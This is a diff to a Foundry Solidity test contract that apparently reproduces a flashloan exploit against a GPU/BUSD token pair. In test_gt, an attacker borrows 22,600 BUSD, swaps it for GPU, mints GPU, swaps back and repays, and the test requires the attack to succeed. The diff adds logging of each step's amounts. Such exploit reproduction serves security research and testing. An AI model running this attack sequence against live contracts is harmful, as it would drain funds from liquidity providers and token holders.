@@ -70,7 +70,7 @@ contract GPUTestBase is Test, BlockLoader {
         // Initialize balances and mock flashloan.
         busd.transfer(address(pair), balanceOfbusdpair);
         gpu.transfer(address(pair), balanceOfgpupair);
-        vm.warp(1715162466 + 18 * 30 * 86400);
+        vm.warp(30 days);
         gpu.afterDeploy(address(router), address(pair));
     }
 
@@ -186,21 +186,35 @@ contract GPUTestBase is Test, BlockLoader {
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 22_600 ether);
         borrow_busd_owner(22_600 ether);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 22_600 ether);
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(22_400 ether, address(busd))
+        );
         swap_pair_attacker_busd_gpu(
             22_600 ether,
             pair.getAmountOut(22_400 ether, address(busd))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", gpu.balanceOf(address(attacker)));
         mint_gpu_attacker(gpu.balanceOf(address(attacker)));
         printBalance("After step2 ");
+        emit log_named_uint("amt4", gpu.balanceOf(address(attacker)));
+        emit log_named_uint(
+            "amt5",
+            (pair.getAmountOut(gpu.balanceOf(address(attacker)), address(gpu)) *
+                9) / 10
+        );
         swap_pair_attacker_gpu_busd(
             gpu.balanceOf(address(attacker)),
             (pair.getAmountOut(gpu.balanceOf(address(attacker)), address(gpu)) *
                 9) / 10
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (22_600 ether * 1003) / 1000);
         payback_busd_owner((22_600 ether * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -223,7 +237,7 @@ contract GPUTestBase is Test, BlockLoader {
         mint_gpu_attacker(amt3);
         swap_pair_attacker_gpu_busd(amt4, amt5);
         payback_busd_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
